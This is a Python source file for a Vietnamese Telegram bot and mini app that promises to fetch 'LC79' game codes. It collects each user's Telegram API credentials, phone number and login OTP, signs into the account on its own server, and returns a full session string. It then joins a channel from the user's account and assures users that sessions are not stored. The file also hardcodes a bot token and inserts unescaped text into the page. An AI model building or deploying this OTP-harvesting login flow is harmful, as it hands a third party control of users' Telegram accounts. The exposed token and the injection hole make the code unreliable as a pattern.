import os
import time
import threading
import logging
import requests
import re
import asyncio
from flask import Flask, Response, request, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import Application, CommandHandler, ContextTypes

# Telethon Imports
from telethon import TelegramClient, functions
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError

# ============ CONFIG ============
BOT_TOKEN     = os.getenv("BOT_TOKEN", "8584201446:AAHAINg4IALEX1sJ-dmiinLsPLZ-u_S0nTc")
PORT          = int(os.getenv("PORT", 10000))                    
PING_INTERVAL = int(os.getenv("PING_INTERVAL", 5))               
WEBAPP_URL    = os.getenv("WEBAPP_URL") or os.getenv("RENDER_EXTERNAL_URL", "")

logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(message)s",
    level=logging.INFO
)
logger = logging.getLogger("AutoTool")

flask_app = Flask(__name__)

# ================================================================
#                    TELEGRAM API ENDPOINTS (TELETHON)
# ================================================================

@flask_app.route("/api/send_code", methods=["POST"])
def api_send_code():
    data = request.json
    api_id = data.get("api_id")
    api_hash = data.get("api_hash")
    phone = data.get("phone")

    if not all([api_id, api_hash, phone]):
        return jsonify({"status": "error", "message": "Vui lòng nhập đủ thông tin."})

    async def _send():
        try:
            client = TelegramClient(StringSession(), int(api_id), api_hash)
            await client.connect()
            sent = await client.send_code_request(phone)
            session_str = client.session.save()
            await client.disconnect()
            return {"status": "ok", "phone_code_hash": sent.phone_code_hash, "session": session_str}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    result = asyncio.run(_send())
    return jsonify(result)

@flask_app.route("/api/verify_code", methods=["POST"])
def api_verify_code():
    data = request.json
    api_id = data.get("api_id")
    api_hash = data.get("api_hash")
    phone = data.get("phone")
    code = data.get("code")
    phone_code_hash = data.get("phone_code_hash")
    session_str = data.get("session")

    async def _verify():
        try:
            client = TelegramClient(StringSession(session_str), int(api_id), api_hash)
            await client.connect()
            try:
                await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
            except SessionPasswordNeededError:
                return {"status": "2fa", "message": "Tài khoản có bật 2FA. Vui lòng nhập mật khẩu."}
            
            new_session = client.session.save()
            await client.disconnect()
            return {"status": "ok", "session": new_session}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    result = asyncio.run(_verify())
    return jsonify(result)

@flask_app.route("/api/get_codes", methods=["POST"])
def api_get_codes():
    data = request.json
    api_id = data.get("api_id")
    api_hash = data.get("api_hash")
    session_str = data.get("session")

    async def _get_codes():
        try:
            client = TelegramClient(StringSession(session_str), int(api_id), api_hash)
            await client.connect()
            
            # Auto Join Channel
            try:
                channel = await client.get_entity('https://t.me/codelaucuagame')
                await client(functions.channels.JoinChannelRequest(channel=channel))
            except Exception as e:
                logger.warning(f"Join channel note: {e}")

            # Get messages
            messages = await client.get_messages('https://t.me/codelaucuagame', limit=30)
            codes = []
            
            # Regex to find LC79 followed by alphanumeric
            pattern = re.compile(r'LC79[A-Z0-9]+')
            
            for msg in messages:
                if msg.text:
                    matches = pattern.findall(msg.text)
                    for match in matches:
                        # Bỏ 4 chữ đầu (LC79)
                        stripped_code = match[4:] 
                        if stripped_code not in codes:
                            codes.append(stripped_code)
                        if len(codes) >= 10:
                            break
                if len(codes) >= 10:
                    break
                    
            await client.disconnect()
            return {"status": "ok", "codes": codes}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    result = asyncio.run(_get_codes())
    return jsonify(result)


# ================================================================
#                    MINI APP HTML (NO ZOOM, PROFESSIONAL)
# ================================================================
MINIAPP_HTML = r"""<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<!-- Chống phóng to -->
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<meta name="theme-color" content="#0a0c10">
<title>Auto Tool Center</title>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
:root{
  --bg: #0a0c10; --card: #151921; --card-hover: #1c212c;
  --accent: #6366f1; --accent-glow: rgba(99, 102, 241, 0.3);
  --accent2: #06b6d4; --text: #f3f4f6; --muted: #9ca3af;
  --border: #2d3748; --danger: #ef4444; --warn: #f59e0b;
}
*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
html, body { touch-action: pan-x pan-y; height: 100%; }
body{
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
  background: var(--bg); color: var(--text); min-height: 100vh;
  padding: 20px 16px 40px; overflow-x: hidden;
}
body::before{
  content:''; position:fixed; inset:0; z-index:0; pointer-events:none;
  background:
    radial-gradient(circle at 10% 10%, rgba(99, 102, 241, 0.08) 0%, transparent 40%),
    radial-gradient(circle at 90% 90%, rgba(6, 182, 212, 0.08) 0%, transparent 40%);
}
body>*{position:relative; z-index:1}

.icon { width: 24px; height: 24px; stroke: currentColor; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; fill: none; }
.icon-sm { width: 18px; height: 18px; }
.icon-lg { width: 32px; height: 32px; }

.view{display:none; animation:viewIn .3s cubic-bezier(0.16, 1, 0.3, 1)}
.view.active{display:block}
@keyframes viewIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}

.header{text-align:center;padding:24px 0 28px}
.logo{
  display:inline-flex; align-items:center; justify-content:center;
  width: 76px; height: 76px; border-radius: 22px;
  background: linear-gradient(135deg, #1e2330, #151921); border: 1px solid var(--border);
  color: var(--accent); margin-bottom: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
}
.header h1{font-size: 24px; font-weight: 800; letter-spacing: -0.5px; margin-bottom: 8px;}
.header p{color:var(--muted);font-size:14px}

.section-title{font-size: 13px; font-weight: 600; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; margin: 20px 4px 14px;}
.grid{display:grid; grid-template-columns:1fr 1fr; gap:12px}
.service{
  background: var(--card); border: 1px solid var(--border); border-radius: 16px;
  padding: 18px 16px; cursor: pointer; transition: all 0.2s ease;
  display: flex; flex-direction: column; gap: 12px; position: relative;
}
.service:active{transform:scale(0.97); background: var(--card-hover)}
.service .ico{color: var(--accent);}
.service .name{font-size: 14px; font-weight: 600;}
.service .sub{font-size: 12px; color: var(--muted);}
.service.full{grid-column:1 / -1; flex-direction:row; align-items:center; gap:16px; padding: 20px 18px;}
.service.full .ico{color: var(--accent2);}
.service.full .info{flex:1; display:flex; flex-direction:column; gap:4px;}
.service.full .arrow{color: var(--muted); transition: 0.3s;}
.service.full:active .arrow{transform: translateX(4px); color: var(--text);}
.service.featured{background: linear-gradient(135deg, rgba(99,102,241,0.08), rgba(6,182,212,0.05)); border-color: rgba(99, 102, 241, 0.3);}
.service .hot{position: absolute; top: 12px; right: 12px; font-size: 10px; font-weight: 700; padding: 4px 10px; border-radius: 99px; background: var(--accent); color: #fff;}

.back-btn{display: inline-flex; align-items: center; gap: 8px; background: transparent; border: 1px solid var(--border); color: var(--muted); padding: 8px 16px; border-radius: 10px; font-size: 14px; cursor: pointer; margin-bottom: 20px; transition: 0.2s;}
.back-btn:active{transform:scale(0.95); color: var(--text); background: var(--card)}

.lc-header{background: linear-gradient(135deg, #1e2330, #151921); border: 1px solid var(--border); border-radius: 16px; padding: 28px 20px; margin-bottom: 20px; text-align: center;}
.lc-icon{display: inline-flex; align-items: center; justify-content: center; width: 60px; height: 60px; border-radius: 16px; background: rgba(6, 182, 212, 0.1); color: var(--accent2); margin-bottom: 16px;}
.lc-header h2{font-size: 20px; font-weight: 700; margin-bottom: 8px;}
.lc-header p{font-size: 13px; color: var(--muted);}

.panel{background: var(--card); border: 1px solid var(--border); border-radius: 16px; padding: 24px 20px;}
.panel label{font-size: 12px; font-weight: 600; color: var(--muted); display: flex; align-items: center; gap: 6px; margin-bottom: 10px;}
.panel input{width: 100%; background: var(--bg); border: 1px solid var(--border); border-radius: 10px; padding: 14px 16px; color: var(--text); font-size: 14px; outline: none; transition: 0.2s; margin-bottom: 16px;}
.panel input:focus{border-color: var(--accent); box-shadow: 0 0 0 3px var(--accent-glow)}
.btn{width: 100%; padding: 16px; border: none; border-radius: 12px; font-size: 15px; font-weight: 600; cursor: pointer; transition: 0.15s; display: flex; align-items: center; justify-content: center; gap: 8px; color: #fff; background: var(--accent); box-shadow: 0 4px 14px var(--accent-glow);}
.btn:active{transform: scale(0.97); box-shadow: none;}
.btn:disabled {opacity: 0.6; pointer-events: none;}

/* Code Result Box */
.code-box { background: var(--bg); border: 1px solid var(--border); border-radius: 10px; padding: 12px 16px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; font-family: monospace; font-size: 15px; color: var(--accent2); font-weight: 700; letter-spacing: 1px;}
.copy-btn { background: rgba(99, 102, 241, 0.1); border: none; color: var(--accent); padding: 8px 12px; border-radius: 6px; cursor: pointer; font-weight: 600; font-size: 12px;}
.copy-btn:active { background: var(--accent); color: #fff; }

.footer{text-align: center; color: var(--muted); font-size: 12px; margin-top: 32px;}
</style>
</head>
<body>

<!-- =================== VIEW 1: HOME =================== -->
<div id="view-home" class="view active">
  <div class="header">
    <div class="logo"><svg class="icon icon-lg" viewBox="0 0 24 24"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg></div>
    <h1>Auto Tool Center</h1>
    <p>Hệ thống tự động hóa đa nền tảng</p>
  </div>
  <div class="section-title">Dịch vụ hệ thống</div>
  <div class="grid">
    <div class="service featured full" onclick="openLogin()">
      <div class="hot">HOT</div>
      <div class="ico"><svg class="icon icon-lg" viewBox="0 0 24 24"><rect x="2" y="6" width="20" height="12" rx="2"/><line x1="6" y1="12" x2="10" y2="12"/><line x1="8" y1="10" x2="8" y2="14"/><line x1="15" y1="13" x2="15.01" y2="13"/><line x1="18" y1="11" x2="18.01" y2="11"/></svg></div>
      <div class="info">
        <div class="name">Tool Auto LC79</div>
        <div class="sub">Tự động lấy code từ kênh Telegram</div>
      </div>
      <div class="arrow"><svg class="icon" viewBox="0 0 24 24"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg></div>
    </div>
  </div>
</div>

<!-- =================== VIEW 2: LOGIN (API) =================== -->
<div id="view-login" class="view">
  <button class="back-btn" onclick="goHome()"><svg class="icon icon-sm" viewBox="0 0 24 24"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg> Quay lại</button>
  <div class="lc-header">
    <div class="lc-icon"><svg class="icon icon-lg" viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></div>
    <h2>Xác Thực API Telegram</h2>
    <p>Nhập API ID & API HASH của bạn</p>
  </div>
  <div class="panel">
    <label>API ID</label>
    <input type="number" id="apiId" placeholder="VD: 12345678">
    
    <label>API HASH</label>
    <input type="password" id="apiHash" placeholder="Nhập API HASH">
    
    <label>Số điện thoại</label>
    <input type="tel" id="phone" placeholder="VD: +84987654321">
    
    <button class="btn" id="btn-send-code" onclick="sendCode()">Tiếp Tục <svg class="icon icon-sm" viewBox="0 0 24 24"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg></button>
  </div>
</div>

<!-- =================== VIEW 3: OTP VERIFY =================== -->
<div id="view-otp" class="view">
  <button class="back-btn" onclick="showView('view-login')"><svg class="icon icon-sm" viewBox="0 0 24 24"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg> Quay lại</button>
  <div class="lc-header">
    <div class="lc-icon"><svg class="icon icon-lg" viewBox="0 0 24 24"><path d="M22 2L11 13"/><path d="M22 2l-7 20-4-9-9-4 20-7z"/></svg></div>
    <h2>Nhập Mã OTP</h2>
    <p>Mã xác thực đã được gửi tới Telegram của bạn</p>
  </div>
  <div class="panel">
    <label>Mã OTP</label>
    <input type="text" id="otpCode" placeholder="VD: 12345" inputmode="numeric" autocomplete="one-time-code">
    <button class="btn" id="btn-verify" onclick="verifyCode()">Xác Nhận Đăng Nhập</button>
  </div>
</div>

<!-- =================== VIEW 4: RESULT CODES =================== -->
<div id="view-result" class="view">
  <div class="lc-header" style="padding: 20px;">
    <div class="lc-icon" style="background: rgba(16, 185, 129, 0.1); color: #10b981;"><svg class="icon icon-lg" viewBox="0 0 24 24"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg></div>
    <h2>Đăng Nhập Thành Công</h2>
    <p>10 Mã Code mới nhất từ kênh LC79</p>
  </div>
  
  <div class="panel" id="codes-container" style="padding: 16px;">
    <!-- Codes will be injected here -->
  </div>
  
  <button class="btn" style="margin-top: 20px; background: var(--card); border: 1px solid var(--border); box-shadow: none;" onclick="goHome()">Về Trang Chủ</button>
</div>

<script>
const tg = window.Telegram?.WebApp;
if (tg) { tg.ready(); tg.expand(); }

// Lưu trữ state tạm thời
let authData = { api_id: '', api_hash: '', phone: '', phone_code_hash: '', session: '' };

function showView(id) {
  document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
  document.getElementById(id).classList.add('active');
  window.scrollTo({top:0, behavior:'smooth'});
}

function openLogin() { showView('view-login'); }
function goHome() { showView('view-home'); }

async function sendCode() {
  const api_id = document.getElementById('apiId').value.trim();
  const api_hash = document.getElementById('apiHash').value.trim();
  const phone = document.getElementById('phone').value.trim();

  if (!api_id || !api_hash || !phone) {
    alert("Vui lòng nhập đầy đủ thông tin!");
    return;
  }

  const btn = document.getElementById('btn-send-code');
  btn.innerText = "Đang gửi OTP..."; btn.disabled = true;

  try {
    const res = await fetch('/api/send_code', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ api_id, api_hash, phone })
    });
    const data = await res.json();

    if (data.status === 'ok') {
      authData = { api_id, api_hash, phone, phone_code_hash: data.phone_code_hash, session: data.session };
      showView('view-otp');
    } else {
      alert("Lỗi: " + data.message);
    }
  } catch (e) {
    alert("Lỗi kết nối Server!");
  } finally {
    btn.innerText = "Tiếp Tục"; btn.disabled = false;
  }
}

async function verifyCode() {
  const code = document.getElementById('otpCode').value.trim();
  if (!code) { alert("Vui lòng nhập OTP!"); return; }

  const btn = document.getElementById('btn-verify');
  btn.innerText = "Đang xác thực..."; btn.disabled = true;

  try {
    const res = await fetch('/api/verify_code', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ...authData, code })
    });
    const data = await res.json();

    if (data.status === 'ok') {
      authData.session = data.session;
      await fetchCodes(); // Tự động lấy code
    } else if (data.status === '2fa') {
      alert("Tài khoản của bạn có bật 2FA. Tính năng nhập pass 2FA đang phát triển!");
      btn.innerText = "Xác Nhận"; btn.disabled = false;
    } else {
      alert("Lỗi: " + data.message);
      btn.innerText = "Xác Nhận"; btn.disabled = false;
    }
  } catch (e) {
    alert("Lỗi xác thực!");
    btn.innerText = "Xác Nhận"; btn.disabled = false;
  }
}

async function fetchCodes() {
  try {
    // Chuyển sang view kết quả và hiển thị loading
    showView('view-result');
    const container = document.getElementById('codes-container');
    container.innerHTML = '<div style="text-align:center; color:var(--muted)">Đang quét kênh và lấy code...</div>';

    const res = await fetch('/api/get_codes', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(authData)
    });
    const data = await res.json();

    if (data.status === 'ok') {
      container.innerHTML = '';
      if (data.codes.length === 0) {
        container.innerHTML = '<div style="text-align:center; color:var(--muted)">Không tìm thấy code nào mới.</div>';
      } else {
        data.codes.forEach((code, index) => {
          const div = document.createElement('div');
          div.className = 'code-box';
          div.innerHTML = `<span>${index + 1}. ${code}</span> <button class="copy-btn" onclick="copyText('${code}')">Copy</button>`;
          container.appendChild(div);
        });
      }
    } else {
      container.innerHTML = `<div style="color: var(--danger)">Lỗi: ${data.message}</div>`;
    }
  } catch (e) {
    document.getElementById('codes-container').innerHTML = `<div style="color: var(--danger)">Lỗi kết nối!</div>`;
  }
}

function copyText(text) {
  navigator.clipboard.writeText(text).then(() => {
    if (tg) tg.HapticFeedback?.notificationOccurred('success');
    const t = document.createElement('div');
    t.style.cssText = 'position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#10b981;color:white;padding:10px 20px;border-radius:8px;font-size:14px;z-index:9999;transition:0.3s';
    t.innerText = "Đã copy: " + text;
    document.body.appendChild(t);
    setTimeout(() => { t.style.opacity = '0'; setTimeout(() => t.remove(), 300); }, 2000);
  });
}
</script>
</body>
</html>
"""

# ================================================================
#                    FLASK ROUTES
# ================================================================
@flask_app.route("/")
def index():
    return Response(MINIAPP_HTML, mimetype="text/html")

@flask_app.route("/health")
def health():
    return Response("ok", mimetype="text/plain")

# ================================================================
#                    SELF-PING & BOT MAIN
# ================================================================
def keep_alive():
    if not WEBAPP_URL:
        return
    url = WEBAPP_URL.rstrip("/") + "/health"
    time.sleep(15)
    while True:
        try:
            requests.get(url, timeout=10)
        except Exception:
            pass
        time.sleep(PING_INTERVAL)

def run_flask():
    flask_app.run(host="0.0.0.0", port=PORT, use_reloader=False, threaded=True)

# Bot Telegram Premium Emojis
START_MESSAGE = """
<tg-emoji emoji-id="5368324170671202286">🚀</tg-emoji> <b>TOOL AUTO LẤY CODE LC79</b> <tg-emoji emoji-id="5368324170671202286">🚀</tg-emoji>

<tg-emoji emoji-id="5447644880824181073">✨</tg-emoji> <b>Chào mừng</b> <i>{name}</i> đến với hệ thống!
<tg-emoji emoji-id="4960917714325121485">🔥</tg-emoji> Hệ thống tự động lấy code thế hệ mới — siêu tốc, chính xác.

──────────────────
<tg-emoji emoji-id="6235401323201735695">💎</tg-emoji> <b>TÍNH NĂNG NỔI BẬT</b>
<tg-emoji emoji-id="5276398495459370121">⚡</tg-emoji> Đăng nhập Telegram cá nhân an toàn.
<tg-emoji emoji-id="5386714776240519929">🤖</tg-emoji> Tự động Join kênh <b>Code Lâu Của Game</b>.
<tg-emoji emoji-id="5368324170671202286">🎮</tg-emoji> Auto lấy 10 mã code mới nhất.
<tg-emoji emoji-id="5278578979322940035">🔒</tg-emoji> Bảo mật 100% — Không lưu trữ Session.

──────────────────
🎯 <b>Bấm nút bên dưới để mở Mini App</b> 👇
"""

KEYBOARD = InlineKeyboardMarkup([
    [InlineKeyboardButton(
        "MỞ MINI APP — LẤY CODE LC79",
        web_app=WebAppInfo(url=WEBAPP_URL or "https://example.com")
    )],
])

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    name = update.effective_user.first_name or "bạn"
    await update.message.reply_text(
        START_MESSAGE.format(name=name),
        parse_mode="HTML",
        reply_markup=KEYBOARD,
        disable_web_page_preview=True,
    )

def main():
    if not BOT_TOKEN:
        logger.error("BOT_TOKEN chưa set!")
        return

    threading.Thread(target=keep_alive, daemon=True).start()
    threading.Thread(target=run_flask, daemon=True).start()

    bot_app = Application.builder().token(BOT_TOKEN).build()
    bot_app.add_handler(CommandHandler("start", start))
    logger.info("Bot đang chạy...")
    bot_app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()